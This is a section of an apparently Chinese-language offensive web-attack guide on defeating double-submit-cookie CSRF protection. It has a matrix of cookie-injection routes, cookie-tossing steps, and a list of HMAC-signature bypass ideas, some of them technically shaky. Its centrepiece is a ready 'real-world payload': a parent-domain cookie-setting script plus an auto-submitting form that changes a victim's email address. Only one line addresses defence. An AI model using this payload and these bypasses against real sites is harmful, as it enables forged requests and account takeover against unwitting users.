## 七、双提交Cookie绕过与Cookie注入

### 7.1 双提交（Double Submit）机制剖析
```
原理（无状态）：页面签发Token时同时写入Cookie与表单/Header，服务端只比对两者是否一致，不查Session
安全性取决于：攻击者能否让受害者的Cookie==攻击者提供的表单Token
```

### 7.2 Cookie注入路径矩阵
| 注入方式 | 条件 | 效果 |
|---------|------|------|
| 子域Cookie注入 | 目标存在攻击者可控子域（接管/XSS/托管） | 以父域Domain写任意Cookie值 |
| Cookie Tossing | 子路径可写Cookie（Path=/）覆盖主域同名Cookie | 同名覆盖（主域优先规则/路径优先规则差异利用） |
| CRLF注入（Set-Cookie） | 响应头可注入`\r\nSet-Cookie:...` | 直接写任意Cookie |
| XSS设置Cookie | 任意XSS | document.cookie（HttpOnly除外） |
| HTTP/HTTPS混写 | HTTP与HTTPS分别存Cookie（Secure差异） | HTTP侧写入→HTTPS读取 |
| 开放重定向+登录接口 | 登录接口可被CSRF驱动且写入可预测Cookie | 与Lax+POST窗口联动 |
| 307重定向跨域 | 服务端307保留POST数据到跨域 | 触发目标写Cookie |

### 7.3 子域Cookie注入实战Payload
```html
<!-- 若攻击者控制 sub.target.com（XSS或托管），注入父域Cookie： -->
<!-- 在sub.target.com页面执行： -->
<script>
document.cookie = "csrf_token=ATTACKER_KNOWN; Domain=.target.com; Path=/";
</script>
<!-- 然后在攻击者站提交表单：csrf_token=ATTACKER_KNOWN（Cookie与表单一致→通过） -->
<form action="https://target.com/api/change-email" method="POST">
  <input type="hidden" name="email" value="<EMAIL-REDACTED>">
  <input type="hidden" name="csrf_token" value="ATTACKER_KNOWN">
</form>
<script>document.forms[0].submit();</script>
```

### 7.4 Cookie Tossing（子路径覆盖）
```
浏览器同名Cookie匹配规则：路径越具体优先、Domain越精确优先
攻击手法：在攻击者页面/子域触发 https://target.com/attackerpath 下的Set-Cookie（Path=/），
若目标存在"未认证即可写cookie"的接口（如跟踪/AB测试/埋点），可覆盖同名的认证CSRF Cookie
再配合表单提交同值Token → 绕过
```

### 7.5 签名双提交（HMAC）绕过
```
若实现为 Token = HMAC(密钥, CookieToken) 且表单同时提交CookieToken与签名：
1. 长度扩展攻击（HMAC-SHA1/256使用不当拼接时）
2. 算法混淆（alg字段可改，如"HS256"→"none"或降级）
3. 签名仅校验前缀/正则
4. 时间戳重放（签名内嵌时间未校验新鲜度）
5. 服务端未把CookieToken纳入校验（仅比对签名字符串）
最有效防御与利用分界：__Host-CSRF-TOKEN前缀（禁止Domain，子域无法注入）+ 密钥签名 + 一次性
```

